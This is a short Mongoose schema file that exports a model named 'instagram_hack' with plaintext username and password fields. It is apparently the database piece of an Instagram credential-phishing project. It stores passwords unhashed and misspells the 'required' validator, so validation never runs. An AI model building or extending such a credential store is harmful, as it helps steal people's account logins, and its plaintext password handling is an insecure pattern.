const express = require("express");
const mongoose = require("mongoose");

const instaSchema = new mongoose.Schema({
    username:{
        type: String,
        require:true,
        // require: [true, "Please provide a username"],
        // minLength: 5,
        // trim: true
    },
    password:{
        type: String,
        // minLength: 5,
        // require: [true, "Please provide a password"]
    }
   
})

const instagram = new mongoose.model("instagram_hack ", instaSchema);

module.exports = instagram;